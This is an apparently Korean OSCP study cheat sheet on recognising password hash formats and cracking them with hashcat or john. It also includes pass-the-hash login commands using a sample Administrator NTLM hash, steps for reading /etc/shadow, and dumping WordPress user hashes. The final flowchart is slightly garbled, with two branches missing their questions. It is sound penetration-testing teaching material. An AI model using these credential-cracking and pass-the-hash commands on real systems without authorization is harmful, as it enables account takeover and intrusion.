---
title: "해시 유형 (Hash Types)"
date: 2026-06-20
weight: 170
draft: false
tags: ["oscp", "cheatsheet"]
summary: "해시를 봤을 때 즉시 판단하는 참조 — 식별, 크랙 가능 여부, 패스더해시 가능 여부."
---

해시를 봤을 때 즉시 판단하는 참조 — 식별, 크랙 가능 여부, 패스더해시 가능 여부.

- 출처: https://heretek.dev/oscp-cheatsheet/hash-types/ (Jean Romero) — 재구성

## 빠른 모드 참조

- NTLM (Windows SAM/secretsdump, 32 hex): `hashcat -m 1000` — PtH 우선, 크랙은 선택
- NTLMv2 (Responder 캡처): `hashcat -m 5600` — 반드시 크랙, PtH 불가
- AS-REP (`$krb5asrep$23$` 접두사): `hashcat -m 18200`
- Kerberoast TGS (`$krb5tgs$23$` 접두사): `hashcat -m 13100`
- Linux shadow `$1$` / `$5$` / `$6$`: `hashcat -m 500` / `7400` / `1800`
- WordPress phpass (`$P$` 접두사): `hashcat -m 400`
- Apache .htpasswd (`$apr1$` 접두사): `hashcat -m 1600`
- MD5 (접두사 없는 32 hex): `hashcat -m 0`
- SHA1 (40 hex): `hashcat -m 100`
- SSH 키 패스프레이즈: ssh2john 추출 후 john (hashcat은 -m 22921)

## 1. NTLM 해시 (Windows SAM / secretsdump)

secretsdump 실행 결과로 이런 줄을 얻는다:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa3b347fb64a282e89bae4:::
```

구조 분해:

```text
Administrator    = username
500              = RID (500 = built-in admin)
aad3b435...      = LM hash (empty/disabled — IGNORE this part)
32693b11e6aa...  = NTLM hash (THIS is what you want)
```

크랙 가능한가? 가능:

```bash
# Extract just the NTLM part (after the second colon)
hashcat -m 1000 ntlm.hash rockyou.txt
```

크랙해야 하나? 아니다 — 패스더해시가 더 빠르다:

```bash
# Why waste time cracking when you can just USE the hash directly?
evil-winrm -i $ip -u Administrator -H '32693b11e6aa3b347fb64a282e89bae4'
impacket-psexec DOMAIN/Administrator@$ip -hashes :32693b11e6aa3b347fb64a282e89bae4
nxc smb $ip -u Administrator -H '32693b11e6aa3b347fb64a282e89bae4'
```

교훈: secretsdump/SAM 덤프의 NTLM 해시는 마스터키와 같다. 실제 패스워드를 몰라도 Windows가 해시를 인증으로 바로 받아들인다. 크랙은 선택 사항 — PtH가 즉시 동작한다.

NTLM을 굳이 크랙해야 할 때:

- RDP가 해시가 아닌 패스워드만 받는 머신일 때
- 실제 패스워드를 웹 앱 같은 다른 서비스에 스프레이하고 싶을 때

## 2. NTLMv2 해시 (Responder 캡처)

네트워크에서 Responder를 돌리다 캡처하는 형태:

```text
svc_backup::HTB:1122334455667788:AAF8B0B...long blob...:0101000000000000
```

크랙 가능한가? 가능 — 반드시 크랙해야 한다:

```bash
hashcat -m 5600 captured.hash rockyou.txt
```

패스더해시 가능? 불가능. NTLMv2는 특정 세션에 묶인 challenge-response 해시라 PtH에 쓸 수 없다. 평문 패스워드를 얻으려면 반드시 크랙한다.

NTLM과의 차이:

- NTLM (SAM 덤프) = 저장된 해시. 바로 재사용 가능.
- NTLMv2 (Responder) = 일회용 challenge-response. 반드시 크랙.

## 3. AS-REP 해시 (AS-REP Roasting)

impacket-GetNPUsers 실행 결과:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7e52e82c669eac43e4f548297b9d772f$...long blob...
```

식별: `$krb5asrep$23$`로 시작한다 — AS-REP 해시 고유 접두사.

크랙 방법:

```bash
hashcat -m 18200 asrep.hash rockyou.txt
# or
john asrep.hash --wordlist=rockyou.txt
```

크랙 없이 사용 가능? 불가. NTLM과 달리 AS-REP 해시는 패스할 수 없다. 평문 패스워드를 얻으려면 반드시 크랙한다.

존재 이유: 계정에 "Do not require Kerberos pre-authentication"이 켜져 있으면 DC가 유저 패스워드로 암호화한 blob을 건네준다. 이 blob을 크랙해 패스워드를 복구한다.

## 4. TGS 해시 (Kerberoasting)

impacket-GetUserSPNs 실행 결과:

```text
$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$a1b2c3...long blob...
```

식별: `$krb5tgs$23$`로 시작한다 — Kerberoasting 해시 고유 접두사.

크랙 방법:

```bash
hashcat -m 13100 kerberoast.hash rockyou.txt
# or
john kerberoast.hash --wordlist=rockyou.txt
```

크랙 없이 사용 가능? 불가. AS-REP와 마찬가지로 평문 패스워드 획득을 위해 반드시 크랙한다.

AS-REP vs TGS 암기법:

```text
$krb5asrep$ = AS-REP Roasting = hashcat -m 18200 = no creds needed
$krb5tgs$   = Kerberoasting   = hashcat -m 13100 = creds needed
```

해시 접두사만 보면 어느 쪽인지 바로 안다.

## 5. Linux shadow 해시 (/etc/shadow)

Linux 박스에서 /etc/shadow를 읽었을 때:

```text
root:$6$xyz123$LongHashStringHere...:19000:0:99999:7:::
```

식별: `$6$` = SHA-512. 첫 $ 뒤 숫자가 해시 유형을 알려준다:

```text
$1$ = MD5        → hashcat -m 500
$5$ = SHA-256    → hashcat -m 7400
$6$ = SHA-512    → hashcat -m 1800  (most common on modern Linux)
```

크랙 방법:

```bash
# Copy the full hash including $6$ and salt
echo '$6$xyz123$LongHashStringHere...' > shadow.hash
hashcat -m 1800 shadow.hash rockyou.txt
```

- shadow 해시는 크랙이 느리다. salted SHA-512는 의도적으로 느리게 설계됐다. rockyou에 몇 시간 걸릴 수 있으니 작은 워드리스트부터 시도한다.

## 6. WordPress 해시 (phpass)

WordPress DB 덤프의 wp_users에서 발견:

```text
admin:$P$BcDsN.F.MIGwMEFfZ3kG6IN0sTqGWs1
```

식별: `$P$`로 시작한다 — WordPress/phpass 해시 고유.

크랙 방법:

```bash
hashcat -m 400 wp_hash.txt rockyou.txt
# or
john wp_hash.txt --wordlist=rockyou.txt
```

WordPress 해시 획득 경로:

- wp_users 테이블을 덤프하는 SQL 인젝션
- MySQL 직접 접근: SELECT user_login, user_pass FROM wp_users;
- wp-config.php 발견 → DB creds 획득 → MySQL 접속 → 유저 덤프

## 7. SSH 키 패스프레이즈

패스워드로 보호된 id_rsa 개인키를 발견:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25...
```

"ENCRYPTED" 표기가 있으면 패스프레이즈가 필요하다는 뜻이다.

크랙 방법:

```bash
# Step 1: Convert to crackable format
ssh2john id_rsa > ssh_hash.txt

# Step 2: Crack with john (preferred for SSH keys)
john ssh_hash.txt --wordlist=rockyou.txt
```

- raw id_rsa 파일을 hashcat에 넣지 않는다 — hashcat은 추출된 해시만 읽는다. raw 키를 넣으면 모든 줄에서 "Separator unmatched"가 난다. 굳이 hashcat을 쓰려면: `hashcat -m 22921 ssh_hash.txt rockyou.txt` (ssh2john 출력 사용, raw 키 아님)

크랙한 패스프레이즈로 키 사용:

```bash
chmod 600 id_rsa
ssh -i id_rsa user@target
# Enter passphrase when prompted
```

## 8. Apache .htpasswd

.htpasswd 파일을 발견:

```text
admin:$apr1$salt$hashedpasswordhere
```

식별: `$apr1$`로 시작한다 — Apache htpasswd 고유.

크랙 방법:

```bash
hashcat -m 1600 htpasswd.hash rockyou.txt
john htpasswd.hash --wordlist=rockyou.txt
```

## 해시 판단 플로우차트

```text
Found a hash
    │
    ├── Is it an NTLM hash from SAM/secretsdump? (32 hex chars, from Windows)
    │     → TRY PASS-THE-HASH FIRST (evil-winrm -H, psexec -hashes)
    │     → Only crack if you need the actual password
    │
    ├── Is it from Responder/relay? (NTLMv2, long with ::)
    │     → MUST CRACK IT (hashcat -m 5600)
    │     → Cannot pass-the-hash with NTLMv2
    │
    │     → AS-REP hash → hashcat -m 18200
    │
    │     → Kerberoast hash → hashcat -m 13100
    │
    ├── Does it start with $6$ or $5$ or $1$?
    │     → Linux shadow → $6$=1800, $5$=7400, $1$=500
    │
    ├── Does it start with $P$?
    │     → WordPress → hashcat -m 400
    │
    ├── Does it start with $apr1$?
    │     → Apache htpasswd → hashcat -m 1600
    │
    ├── Is it a 32 character hex string with no prefix?
    │     → Probably MD5 → hashcat -m 0
    │
    ├── Is it a 40 character hex string?
    │     → Probably SHA1 → hashcat -m 100
    │
    └── Dont know?
          → Run: hashid 'paste_hash_here'
          → Or: hash-identifier
```
